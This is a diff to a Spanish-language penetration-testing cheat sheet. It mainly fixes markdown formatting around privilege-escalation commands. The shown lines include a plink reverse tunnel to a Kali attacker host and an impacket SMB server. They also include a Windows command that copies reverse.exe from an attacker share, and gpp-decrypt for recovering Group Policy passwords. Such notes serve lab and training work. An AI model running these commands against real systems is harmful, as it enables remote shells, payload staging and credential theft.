@@ -108,13 +108,14 @@ powershell -c "$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -For
 plink.exe -l <KALI_USER> -pw <KALI_USER_PASS> -R <KALI_PORT>:<LOCAL_IP/LOCALHOST_IP>:<LOCAL_PORT> <KALI_IP>
 ```
 ### Transferencia de archivos mediante smb[](#transferencia-de-archivos-mediante-smb)
+
 ```python
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . #Kali
 
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe #Windows
+```
+### Desencriptado GPP
 
-#### 
-
-Desencriptado GPP[](#desencriptado-gpp)
-
+```python
 gpp-decrypt "<hash>"
+```
